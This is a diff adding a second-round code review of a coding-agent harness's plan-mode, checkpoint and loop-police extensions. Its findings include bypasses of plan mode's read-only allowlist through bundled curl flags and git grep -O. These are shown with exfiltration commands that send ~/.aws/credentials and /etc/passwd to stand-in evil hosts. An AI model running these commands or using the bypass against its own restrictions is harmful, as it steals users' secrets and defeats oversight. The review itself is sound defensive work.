@@ -1,44 +1,52 @@
 ---
 phase: 07-composed-extensions-pinned-reviewed
-reviewed: 2026-08-15T00:00:00Z
+reviewed: 2026-08-15T08:40:00Z
+iteration: 2
 depth: standard
 files_reviewed: 28
 files_reviewed_list:
-  - .gitignore
-  - .pi/agents/planner.md
+  - .pi/extensions/checkpoint/PROVENANCE.md
   - .pi/extensions/checkpoint/git.ts
   - .pi/extensions/checkpoint/index.ts
   - .pi/extensions/checkpoint/store.ts
-  - .pi/extensions/loop-police/index.ts
-  - .pi/extensions/loop-police/loop-police.ts
   - .pi/extensions/loop-police/PROVENANCE.md
+  - .pi/extensions/loop-police/loop-police.ts
+  - .pi/extensions/plan-mode/PROVENANCE.md
   - .pi/extensions/plan-mode/index.ts
+  - .pi/extensions/plan-mode/read-only.ts
   - .pi/extensions/plan-mode/utils.ts
-  - .pi/extensions/questionnaire.ts
-  - .pi/extensions/todo.ts
+  - .pi/extensions/questionnaire.PROVENANCE.md
+  - .pi/extensions/safety/shell.ts
+  - .pi/extensions/todo.PROVENANCE.md
   - .pi/scripts/worktree-setup-hook.mjs
-  - .pi/settings.json
   - bin/bootstrap.sh
   - docs/EXTENSIONS.md
   - docs/RUNBOOK.md
-  - tests/helpers/worktree.ts
+  - tests/helpers/bootstrap-repo.ts
   - tests/integration/git-checkpoint.test.ts
+  - tests/integration/subagent-config-merge.test.ts
   - tests/integration/worktree-build.test.ts
-  - tests/unit/contributing-boundary.test.ts
+  - tests/unit/checkpoint-store.test.ts
   - tests/unit/docs-policy.test.ts
-  - tests/unit/extension-composition.test.ts
-  - tests/unit/extension-pins.test.ts
-  - tests/unit/subagent-agents-config.test.ts
-  - tests/unit/subagent-capabilities.test.ts
-  - tests/unit/tool-count-baseline.test.ts
+  - tests/unit/loop-police-hook-egress.test.ts
+  - tests/unit/plan-mode-read-only.test.ts
+  - tests/unit/secret-scan.test.ts
   - tests/unit/vendor-license-audit.test.ts
   - tests/unit/workflow-budgets.test.ts
+# `findings` counts what is NEWLY FOUND in iteration 2 (incomplete fixes,
+# regressions, and defects introduced by the fix pass). Iteration 1s counts
+# and its fix_pass record are preserved verbatim below and in the body.
 findings:
+  critical: 3
+  warning: 5
+  info: 0
+  total: 8
+findings_iteration_1:
   critical: 4
   warning: 19
   info: 7
   total: 30
-status: fixes_applied
+status: issues_found
 fix_pass:
   applied_at: 2026-08-15
   critical_fixed: 4
@@ -1263,3 +1271,457 @@ _Reviewed: 2026-08-15_
 _Reviewer: Claude (gsd-code-reviewer)_
 _Depth: standard_
 _Fixed: 2026-08-15 — 4 of 4 Critical, 19 of 19 Warning, 0 of 7 Info (out of scope)_
+
+---
+
+# Iteration 2 — re-review after the fix pass (2026-08-15)
+
+**Scope:** the 28 source files the fix pass touched (`git diff 72b7c0a..HEAD`,
+`.planning/` excluded). **Method:** execution and mutation, not reading. Every
+claim below was produced by running the shipped code or by mutating its subject
+and observing the suite. The repository was left byte-identical
+(`git status --porcelain` empty after every mutation).
+
+**Baseline re-established:** `npx vitest run` → 97 files / 1727 tests green.
+`npx tsc --noEmit` → clean.
+
+## What the fix pass genuinely fixed (verified by mutation, not by reading)
+
+| Finding | Mutation applied | Result |
+|---|---|---|
+| CR-01 | Appended a fake 12-digit account id + `arn:aws:iam::<12 digits>:user/bob` to `docs/RUNBOOK.md` | `secret-scan.test.ts` Direction 1 **RED**. Scanner fires; Directions 2–4 keep it non-vacuous. |
+| CR-02 | Deleted the `pathsAddedSince` removal loop from `restoreCheckpoint` | `git-checkpoint.test.ts` cases 1 and 6 **RED**. |
+| CR-04 | Deleted `restoreCheckpoint(root, match.sha);` from the `/checkpoint-restore` handler body | `git-checkpoint.test.ts` cases 5 and 6 **RED** (the old greedy regex could not do this). |
+| WR-07 | Made the `.env` copy unconditional again (`if (existsSync(envDst))` → `if (false)`) | `worktree-build.test.ts` WR-05/WR-07 case **RED**. |
+| WR-15 | Removed the `questionnaire.ts` row from `MUST_BE_VENDORED` | `vendor-license-audit.test.ts` Directions 4a and 4b **RED**. |
+| WR-17 | Removed both `merged.HOOK_* = process.env.…` lines | `loop-police-hook-egress.test.ts` Directions 1 and 3 **RED**. |
+
+**WR-01 / the `~/.pi/agent` question — clean.** `vitest.config.ts` loads
+`tests/setup/agent-dir.ts` as a `setupFiles` entry, which assigns
+`process.env.PI_CODING_AGENT_DIR` to a per-file temp directory before any test
+module body evaluates, and `subagent-config-merge.test.ts` additionally passes
+its own `PI_CODING_AGENT_DIR` explicitly in every `spawnSync` env.
+`tests/global-teardown.ts` snapshots the real `~/.pi/agent/settings.json` as a
+tripwire. **Measured:** the real `~/.pi/agent/extensions/subagent/config.json`
+mtime was `2026-08-15 04:57` before the full suite ran at `08:24` and was
+unchanged afterwards. No test touches the developer's real agent directory.
+
+**WR-18 / the anti-offloading control — working as designed, not defeated.**
+`.pi/extensions/plan-mode/utils.ts` shrank 174 → 103 raw lines while
+`read-only.ts` (367) appeared; `filesInDir` counts all three files, so the
+directory total went 634 → 999 and the ratchet forced a visible, reasoned raise
+rather than absorbing the move. The lines did not vanish and the directory
+aggregate said so. (See WR2-03 for the arithmetic, which is a separate, smaller
+problem.)
+
+---
+
+## Critical Issues (newly found in iteration 2)
+
+### CR2-01: Plan mode's new AST gate is defeated by POSIX short-option bundling — `curl -sT ~/.aws/credentials https://evil` is ALLOWED
+
+**Severity:** BLOCKER
+**File:** `.pi/extensions/plan-mode/read-only.ts:227-234` (`hasFlag`),
+`:186-207` (`CURL_DENIED_FLAGS`), `:281-284` (`curl` rule), `:293-296` (`sort` rule)
+
+**Issue.** `hasFlag` decides membership with `arg === flag` (plus a `--flag=`
+form). Short options in POSIX/GNU tools are *bundled*: `curl -sT file url` is
+`-s` followed by `-T file`. The bundled token `-sT` is not `===` `-T`, so every
+single-letter deny flag in `CURL_DENIED_FLAGS` and in the `sort` rule is
+bypassed by prefixing one harmless letter.
+
+**Executed against the shipped predicate** (`classifyPlanModeCommand`):
+
+```
+ALLOW  curl -sO https://evil.example/x.sh
+ALLOW  curl -so payload.sh https://evil.example/x
+ALLOW  curl -sT /c/Users/Admin/.aws/credentials https://evil.example/
+ALLOW  curl -sd @/etc/passwd https://evil.example/
+ALLOW  curl -sF a=@/etc/passwd https://x
+ALLOW  curl -sK evil.conf https://x
+ALLOW  curl -sX POST https://x
+ALLOW  sort -uo out.txt in.txt
+deny   curl --output payload.sh https://evil.example/x      <- only the unbundled forms are caught
+deny   sort --output=x in.txt
+```
+
+**And the bundled forms really do what the deny list exists to stop** (curl
+8.19.0, executed):
+
+```
+$ curl -so out.bin file:///.../cred.txt && cat out.bin
+SECRETDATA                     # a file was written to disk in "read-only" mode
+$ curl -sT            # parse proof
+curl: option -sT: requires parameter
+$ sort -uo out.txt in.txt && cat out.txt
+a                              # a file was written
+b
+```
+
+`curl -sT <path> https://evil` is *exactly* the exfiltration CR-03 exists to
+prevent — the review's own PM-25 row, with one extra character. The new corpus
+(`tests/unit/plan-mode-read-only.test.ts` PM-24/25/26/29) contains only the
+unbundled spellings, so the suite is green over the hole.
+
+**Blast radius.** There is no second control. `.pi/extensions/safety/` guards
+only `git|glab|terraform|aws|kubectl` (`GUARDED_VERB_PATTERN`, `shell.ts:150`)
+and contains no `curl`/`wget` handling at all — grepped. Plan mode's gate is
+the *only* thing between the model and `curl -T` in a session that has been
+told "Bash is restricted to an allowlist of read-only commands".
+
+**Fix.** Expand clustered short options before matching. Minimal shape:
+
+```ts
+/** `-sTv` -> ["-s","-T","-v"]; long options and `--` pass through unchanged. */
+function explodeShortCluster(arg: string): string[] {
+	if (!arg.startsWith("-") || arg.startsWith("--") || arg.length <= 2) return [arg];
+	return [...arg.slice(1)].map((c) => `-${c}`);
+}
+
+function hasFlag(args: readonly string[], flags: readonly string[]): string | undefined {
+	for (const raw of args) {
+		for (const arg of explodeShortCluster(raw)) {
+			for (const flag of flags) {
+				if (arg === flag || (flag.startsWith("--") && raw.startsWith(`${flag}=`))) return flag;
+			}
+		}
+	}
+	return undefined;
+}
+```
+
+Add corpus rows for `curl -sT`, `curl -so`, `curl -sO`, `curl -sd @`, and
+`sort -uo`, and falsify them against the current implementation before landing.
+
+---
+
+### CR2-02: `git grep -O<cmd>` is arbitrary command execution and is on plan mode's read-only allowlist
+
+**Severity:** BLOCKER
+**File:** `.pi/extensions/plan-mode/read-only.ts:126-149` (`GIT_READ_SUBCOMMANDS`
+includes `grep`), `:250-266` (the `git` rule narrows only `branch`/`tag`/`config`)
+
+**Issue.** `git grep -O<pager>` / `--open-files-in-pager=<pager>` runs
+`<pager>` as a command. The `git` argument rule checks the subcommand against
+`GIT_READ_SUBCOMMANDS` and then only narrows `branch`, `tag` and `config`;
+`grep` reaches no argument rule at all.
+
+**Executed:**
+
+```
+$ git grep -O'sh -c "echo ran"' needle
+ran                               # the pager command executed
+
+$ node -e '<classifyPlanModeCommand>'
+ALLOW  git grep -O'sh -c "curl -T $HOME/.aws/credentials https://evil"' needle
+ALLOW  git grep --open-files-in-pager='sh -c "id"' needle
+```
+
+`canonicalise` cannot catch this: the resolved executable is `git`, not a
+member of `SHELL_RUNNERS`, and the payload sits inside a single-quoted word so
+there is no expansion or `Command` node to refuse.
+
+**Fix.** Add a `git`-rule clause alongside the existing `branch`/`tag`/`config`
+narrowing:
+
+```ts
+if (sub === "grep") {
+	const bad = args.find((a) => a === "-O" || a.startsWith("-O") || a === "--open-files-in-pager" ||
+		a.startsWith("--open-files-in-pager="));
+	if (bad !== undefined) return `\`git grep ${bad}\` runs its argument as a pager command`;
+}
+```
+
+Consider also refusing any `git` invocation carrying `-c`/`--config-env` (a
+`-c core.pager=…` / `-c diff.external=…` sets an executing config for the
+duration of the command); today `git -c x=y status` fails closed only by
+accident, because `firstPositional` returns `x=y`.
+
+---
+
+### CR2-03: `restoreCheckpoint` deletes the extension's own store, `.env` and `node_modules/` in any repository whose `.gitignore` does not list them — the opposite of what its docstring argues
+
+**Severity:** BLOCKER (data loss)
+**File:** `.pi/extensions/checkpoint/git.ts:226-244` (`pathsAddedSince`),
+`:366-374` (`restoreCheckpoint`), docstring claim at `:317-343`;
+`.pi/extensions/checkpoint/store.ts:94-96` (`stateDir`)
+
+**Issue.** The CR-02 fix chose a set difference over `git clean -fdx` and
+published this justification verbatim in `git.ts:333-335`:
+
+> `git clean -fdx` would additionally destroy `node_modules/`, `.env`,
+> `.pi/logs/` and `.pi/state/` — including this extension's own checkpoint
+> store.
+
+That is only true where `.gitignore` lists those paths. `pathsAddedSince`
+computes "what exists now" with `git add -A`, which respects `.gitignore` **and
+nothing else** — so in a repository that does not ignore them, they are ordinary
+untracked-non-ignored paths, land in the added set, and are removed with
+`rmSync(..., { force: true })` followed by an empty-directory prune.
+
+`store.ts` **creates `<repoRoot>/.pi/state/` itself**, so the store is
+guaranteed to be an untracked path in every repository except this one.
+
+**Executed** (fresh repo, one commit, no `.gitignore`; the exact `turn_start`
+ordering `index.ts:106-128` uses — `createCheckpoint` then `recordCheckpoint`):
+
+```
+store written at: <repo>\.pi\state\checkpoints.json
+--- after restoreCheckpoint(repo, sha) ---
+.pi/state/checkpoints.json         false
+.pi/state                          false
+.pi                                false
+notes.txt                          false      <- hand-written untracked file
+.env                               false      <- SECRET=abc, destroyed
+node_modules/dep/index.js          false
+a.txt                              true
+readCheckpoints after restore: []
+```
+
+One restore destroys the index naming **every other** checkpoint, so the user
+cannot restore to any of them and the extension reports "no checkpoints
+recorded yet". The blast radius measured here is *worse* than the `git clean -fd`
+the docstring says it avoids, because it also deletes the store `clean` would
+at least have had to be told (`-x`) to touch.
+
+**Reachability.** `package.json` declares `pi.extensions: ["./.pi/extensions"]`,
+so `pi install https://github.com/kaiyitkoh/ky-pi-agent` — the stated
+distribution model — loads this extension at user scope and `rootFor(ctx.cwd)`
+resolves the **session's** repository, not this one. Today, with no package
+installed (`RB-07-02` OUTSTANDING), the exposure is project-scoped and this
+repo's `.gitignore` covers all three paths; the moment the harness is installed
+as designed it applies to every repository the user opens, including the work
+repo where `main` auto-deploys.
+
+Even inside this repository the removal half deletes any hand-written
+untracked-non-ignored file created since the checkpoint (a new source file, an
+un-added fixture) with no confirmation, and no documented recovery path — the
+blob exists only under a later `refs/kypi-checkpoints/<sha>` tree.
+
+**Fix (two parts).**
+
+1. Make the extension's own state unremovable by making it symmetric, the way
+   `SECRET_EXCLUDE_PATHSPECS` already is — both `add -A` sites read one
+   constant, so one line covers capture and restore:
+
+   ```ts
+   export const SECRET_EXCLUDE_PATHSPECS = [
+   	":(exclude).pi/state",        // this module's OWN store -- never capture, never delete
+   	":(exclude).pi/logs",
+   	":(exclude)*.pem",
+   	// ...
+   ] as const;
+   ```
+
+   Add a `git-checkpoint.test.ts` case that records a checkpoint, restores, and
+   asserts `readCheckpoints(repo).length` is unchanged in a repo with **no**
+   `.gitignore` — it goes red today.
+
+2. Either correct the docstring at `git.ts:317-343` (the set difference is not
+   safer than `git clean -fd` for untracked-non-ignored paths, it is identical),
+   or narrow the removal half to paths the checkpoint could plausibly own, and
+   publish the residual in `docs/EXTENSIONS.md` beside the WR-19 entry — which
+   currently records only the *capture* hazard and says nothing about restore
+   deleting untracked user files.
+
+---
+
+## Warnings (newly found in iteration 2)
+
+### WR2-01: The WR-04 case-folding regression test cannot fail — the fix it claims to prove is removable with the suite still green
+
+**Severity:** WARNING
+**File:** `tests/integration/worktree-build.test.ts:278-313`;
+`.pi/scripts/worktree-setup-hook.mjs:163-171` (`canonical`)
+
+**Issue.** Removing the fix — `return process.platform === "win32" ? out.toLowerCase() : out;`
+→ `return out;` — leaves the whole file green on Windows:
+
+```
+$ npx vitest run tests/integration/worktree-build.test.ts    # with the fix removed
+Test Files  1 passed (1)
+Tests  8 passed (8)
+✓ WR-04 -- containment holds when the worktreePath is spelled with different case (Windows)
+```
+
+The reason is that `canonical` calls `realpathSync.native` first, and that
+already canonicalises drive-letter case for a path that exists:
+
+```
+orig                C:\Users\Admin\AppData\Local\Temp\wr04-3fWr2l
+swapped             c:\Users\Admin\AppData\Local\Temp\wr04-3fWr2l
+realpath(swapped)   C:\Users\Admin\AppData\Local\Temp\wr04-3fWr2l
+equal without toLowerCase?  true
+```
+
+The fixture uses `mkdtempSync`, so both paths exist and the fold is never
+load-bearing. The case's own docstring states the counterfactual "Before the
+`canonical()` fix the hook would have junctioned and copied into the parent",
+which is false for this fixture, and the enclosing describe block claims
+"MUTATION-VERIFIED". This is the CR-04 shape reintroduced by the pass that was
+fixing CR-04.
+
+(The fold is not useless — it is the only guard on the branch where
+`realpathSync.native` throws, i.e. a `repoRoot`/`worktreePath` not yet on disk.
+That is the branch the test has to reach.)
+
+**Fix.** Point the case at a path that does **not** exist, so `realpath` throws
+and the fold decides:
+
+```ts
+const parent = scratch("kypi-hook-case-");
+const repo = join(parent, "NotYetCreated");            // deliberately absent
+const swapped = repo.replace(/NotYetCreated$/, "notyetcreated");
+// worktreePath must exist (existsSync check runs after containment):
+mkdirSync(swapped, { recursive: true });
+expect(runHook({ version: 1, repoRoot: repo, worktreePath: swapped }).status).toBe(1);
+```
+
+Then re-run the mutation and record that it goes red.
+
+### WR2-02: `classifyPlanModeCommand` throws a `TypeError` on a non-string command — a throw out of a `tool_call` handler is fail-open
+
+**Severity:** WARNING
+**File:** `.pi/extensions/plan-mode/read-only.ts:326-328`; caller
+`.pi/extensions/plan-mode/index.ts:299`
+
+**Issue.** `index.ts` does `const command = event.input.command as string;` — an
+unchecked assertion — and `classifyPlanModeCommand` immediately calls
+`command.trim()`. Executed:
+
+```
+undefined -> THREW: TypeError Cannot read properties of undefined (reading 'trim')
+null      -> THREW: TypeError Cannot read properties of null (reading 'trim')
+123       -> THREW: TypeError command.trim is not a function
+{"a":1}   -> THREW: TypeError command.trim is not a function
+```
+
+This is a **new** failure mode: upstream's `isSafeCommand` used
+`RegExp.test(command)`, which coerces and never throws. In a fail-closed gate a
+throw is the wrong direction — a handler that throws does not return
+`{ block: true }`, so the call is not blocked. `event.input` is documented as
+mutable in place with no re-validation, so an earlier-loaded `tool_call`
+handler can put a non-string there.
+
+**Fix.**
+
+```ts
+export function classifyPlanModeCommand(command: unknown): PlanModeVerdict {
+	if (typeof command !== "string" || command.trim() === "") {
+		return { kind: "deny", reason: "empty or non-string command" };
+	}
+	// ...
+```
+
+and drop the `as string` at the call site.
+
+### WR2-03: The budget registry's stated arithmetic does not match its numbers, and 5 of 6 raises grant an extra undeclared decade
+
+**Severity:** WARNING
+**File:** `tests/unit/workflow-budgets.test.ts:84-266`
+
+**Issue.** Each raise says "measured N raw lines … rounded up to the next ten",
+and `countRawLines` is `readFileSync(...).split("\n").length`. Re-measured with
+that exact function:
+
+| Entry | budget | `why` says | actual `countRawLines` | "next ten" would be |
+|---|---|---|---|---|
+| `checkpoint/index.ts` | 240 | 229 | **230** | 230 |
+| `loop-police/loop-police.ts` | 1290 | 1276 | 1276 | 1280 |
+| `plan-mode/index.ts` | 540 | 529 | **529** | 530 |
+| `todo.ts` | 360 | 352 | **357** | 360 |
+| dir `checkpoint` | 940 | 933 (229+374+330) | **936** (230+375+331) | 940 |
+| dir `loop-police` | 1310 | 1299 | 1299 | 1300 |
+| dir `plan-mode` | 1010 | 999 | 999 | 1000 |
+
+Every raise is a genuine re-measurement — none is a disguised relaxation, and
+the anti-offloading control did fire for plan-mode. But the `why` figures
+disagree with the function the assertions use (they look like content-line
+counts, one short per file), and five entries carry ten more lines of headroom
+than the stated rule yields. The audit trail *is* the control here: a future
+maintainer who re-measures by the documented method gets different numbers and
+cannot tell a drift from a rounding habit.
+
+**Fix.** Recompute each `why` with `countRawLines` and set each budget to
+`Math.ceil(actual / 10) * 10`. Consider asserting the rule instead of restating
+it: `expect(entry.budget).toBeLessThan(actual + 10)` would make an over-granted
+budget red on its own.
+
+### WR2-04: `/loop-police save` persists the live, environment-sourced `HOOK_CMD` to disk, contradicting the WR-17 block that says it cannot
+
+**Severity:** WARNING
+**File:** `.pi/extensions/loop-police/loop-police.ts:216-221` (the claim),
+`:239-243` (the module-init ordering), `:792-800` (`/loop-police save`)
+
+**Issue.** The WR-17 vendoring block states:
+
+> The on-disk keys are still written as `""` … the override happens AFTER the
+> write below, so a live hook value is never persisted to disk either.
+
+True for the module-init write only. `/loop-police save` writes `cfg` — which by
+then holds `process.env.KYPI_LOOP_POLICE_HOOK_CMD` — straight into
+`CONFIG_PATH`. An operator who exports a hook and then saves lands the full
+command line (plausibly containing a URL, a token or a path) in
+`.pi/extensions/loop-police/loop-police.json`.
+
+Mitigating facts, checked: the file **is** gitignored (`.gitignore:169`) so it
+cannot be committed, and the value is re-overridden from the environment on the
+next load, so this is not an execution escalation. The defect is that a
+security-critical vendoring note asserts something the code does not do.
+
+**Fix.** Blank the two keys in the saved object rather than the docstring:
+
+```ts
+const persistable = { ...cfg, HOOK_CMD: "", HOOK_LOG: "" };
+writeFileSync(CONFIG_PATH, JSON.stringify(persistable, null, 2) + "\n", "utf-8");
+```
+
+### WR2-05: `:(exclude)credentials` in `SECRET_EXCLUDE_PATHSPECS` matches only a repo-root `credentials` file
+
+**Severity:** WARNING
+**File:** `.pi/extensions/checkpoint/git.ts:197-207`;
+documented as a mitigation in `docs/EXTENSIONS.md:308-316`
+
+**Issue.** A git pathspec with no wildcard is a literal path match. `*.pem`
+matches at any depth (git's `*` crosses `/` without `:(glob)` magic), but
+`credentials` does not. Executed:
+
+```
+$ git add -A -- . ':(exclude)credentials' ':(exclude)*.pem'
+$ git diff --cached --name-only
+  sub/.aws/credentials        <- CAPTURED
+$ git status --porcelain
+  ?? credentials              <- excluded (root only)
+  ?? sub/key.pem              <- excluded (any depth)
+```
+
+So a repo-local `.aws/credentials`, `config/credentials`, or
+`terraform/credentials` — the shape the exclusion is named for — is still
+written into `.git/objects` on every turn, contrary to the residual note.
+
+**Fix.** `":(exclude)*credentials"` (or `":(exclude)**/credentials"` with
+`:(glob)` magic), plus a `git-checkpoint.test.ts` case asserting a nested
+`credentials` is absent from the checkpoint tree.
+
+---
+
+## Verdict
+
+The four iteration-1 BLOCKERs are all genuinely closed at the level they were
+written at, and the fix-pass tests are non-vacuous where I could mutate them —
+with one exception (WR2-01). What did not hold is the *reach* of two of those
+fixes: CR-03's new allowlist is bypassed by a one-character change to the same
+`curl` exfiltration the finding named (CR2-01) and by an unnarrowed
+`git grep -O` (CR2-02), and CR-02's removal half destroys the extension's own
+durable state — plus `.env` and `node_modules` — in every repository except this
+one, while its docstring argues the opposite (CR2-03).
+
+None of the three is a regression of iteration 1's *stated* defect; all three
+are incomplete fixes with the same blast radius as the originals, and all three
+are reachable with the code exactly as it stands today.
+
+---
+
+_Reviewed: 2026-08-15 (iteration 2)_
+_Reviewer: Claude (gsd-code-reviewer)_
+_Depth: standard — verified by execution and mutation; repository left unmodified_
